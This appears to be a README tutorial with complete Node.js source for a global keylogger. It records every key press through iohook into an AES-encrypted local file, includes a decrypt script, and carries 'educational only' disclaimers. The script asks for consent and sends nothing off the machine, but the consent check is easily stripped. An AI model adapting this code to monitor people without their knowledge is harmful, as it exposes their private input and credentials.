# keyLOG
<!-- Made BY Binary Quest -->

<b>!!! NOTE - THIS CODE IS FOR EDUCATIONAL PURPOSE ONLY.(DON'T TRY IT WITHOUT KNOWLEDGE ABOUT THIS CODE)⚠️
>AUTHORS WON'T BE RESPONSIBLE FOR ANY ILLIGAL ACTIVITY</b>
1) Pre-requisites:

>Install Node.js (v14+ recommended) on your PC.

2) Create a new folder for your project and initialize:
Open your terminal/command prompt:


```
mkdir keylogger
cd keylogger
npm init -y
```

3) Install dependencies
We'll use:

iohook for global keyboard capturing
no external encryption lib needed, Node.js's crypto is sufficient
Install iohook:

```
npm install iohook
```

4) Create the main script: index.js
>step - In your text editor (VS Code, Notepad++, etc.), create a new file called index.js and paste this:

```
const iohook = require('iohook');
const readline = require('readline');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const LOG_FILE = path.join(__dirname, 'keylog.enc'); // encrypted log file path
const ALGORITHM = 'aes-256-cbc';

// Store logs in memory as lines of text
let logs = [];

// Generate a random IV for AES
function generateIV() {
  return crypto.randomBytes(16);
}

// Encrypt string with password using AES-256-CBC
function encrypt(text, password) {
  const iv = generateIV();
  const key = crypto.scryptSync(password, 'salt', 32);
  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  // Return iv + encrypted data as hex
  return iv.toString('hex') + ':' + encrypted;
}

// Ask user confirmation and password
function askQuestion(query) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise(resolve => rl.question(query, ans => {
    rl.close();
    resolve(ans);
  }));
}

(async () => {
  console.log("!!! WARNING: This program will record ALL your keyboard input.");
  let consent = await askQuestion("Do you want to start capturing keyboard input? (yes/no): ");
  consent = consent.trim().toLowerCase();

  if (consent !== 'yes') {
    console.log("Consent not given. Exiting.");
    process.exit(0);
  }

  const password = await askQuestion("Enter a password to protect your log file: ");
  if (!password) {
    console.log("Password cannot be empty. Exiting.");
    process.exit(1);
  }

  console.log("Keyboard logging started. Press Ctrl+C to stop and save.");

  // Listen for keyboard events
  iohook.on('keydown', event => {
    // Decode key - event.keychar may be undefined for some keys; log raw keycode and timestamp
    const time = new Date().toISOString();
    let keyStr = event.rawcode || event.keycode || event.keychar || 'UnknownKey';
    logs.push(`[${time}] Key: ${keyStr}`);
  });

  iohook.start();

  // On exit, save the encrypted log file
  const saveLogs = () => {
    if (logs.length === 0) {
      console.log("No keystrokes logged.");
      process.exit(0);
    }
    const plainText = logs.join('\n');
    const encrypted = encrypt(plainText, password);
    fs.writeFileSync(LOG_FILE, encrypted, { encoding: 'utf8' });
    console.log(`\nLogs saved encrypted to: ${LOG_FILE}`);
    process.exit(0);
  };

  process.on('SIGINT', () => {
    console.log('\nReceived interrupt signal. Saving logs...');
    iohook.stop();
    saveLogs();
  });

})();
```

5) Usage instructions:
Run the script by typing in terminal:

```
node index.js
```

It will display a warning and prompt:
Do you want to start capturing keyboard input? (yes/no):
Type yes if you want to proceed.

It will ask for a password to protect the log file.
Enter any password you want.

After that, all your key presses will be recorded until you press Ctrl+C to stop.

On exit, your log file will be saved encrypted as keylog.enc in the same folder.

6) To read the log file later
Here's a simple decrypt script you can create as decrypt.js to decrypt and view logs:

```
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const LOG_FILE = path.join(__dirname, 'keylog.enc');
const ALGORITHM = 'aes-256-cbc';

function decrypt(encryptedText, password) {
  const [ivHex, encryptedData] = encryptedText.split(':');
  const iv = Buffer.from(ivHex, 'hex');
  const key = crypto.scryptSync(password, 'salt', 32);
  const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
  let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

const readline = require('readline');
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

rl.question('Enter password to decrypt log file: ', password => {
  if (!fs.existsSync(LOG_FILE)) {
    console.error('Log file not found!');
    process.exit(1);
  }
  const encryptedContent = fs.readFileSync(LOG_FILE, 'utf8');
  try {
    const decrypted = decrypt(encryptedContent, password);
    console.log('\n--- Decrypted Logs ---\n');
    console.log(decrypted);
  } catch (err) {
    console.error('Failed to decrypt file. Wrong password or corrupted file.');
  }
  rl.close();
});
```

Run it with:

```
node decrypt.js
```

Recap:
You'll have two scripts: index.js (to record) and decrypt.js (to read).
keylog.enc file stores encrypted logs.
Password you provide protects your data.
Notes:
This script uses native Node.js modules and a popular native keylogger iohook.
You might need to build iohook binaries on some platforms, Replit and some environments may not support it well. Preferred to run locally on your PC.
You must run this script with admin privileges on some systems for global keyboard capture.

AGAIN NOT RECOMENDED TO USE WITHOUT PC OWNER'S PERMISSION.
